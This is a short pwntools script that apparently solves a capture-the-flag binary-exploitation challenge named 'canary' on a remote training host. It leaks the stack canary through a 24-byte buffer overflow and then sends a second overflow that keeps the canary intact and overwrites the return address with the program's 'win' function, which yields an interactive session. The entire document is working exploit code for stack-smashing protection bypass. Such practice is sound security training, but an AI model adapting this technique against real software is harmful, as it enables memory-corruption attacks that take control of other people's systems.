from pwn import *

context.binary = e = ELF("./canary")
p = remote("beta.hackac.live", 8005)

p.sendline(b"a"*24)
p.recvuntil(b"a"*24)
canary = b"\x00" + p.recv(8)[1:]
log.info(canary.hex())

p.sendline(b"a"*24+canary+b"a"*8+p64(e.sym.win))
p.interactive()
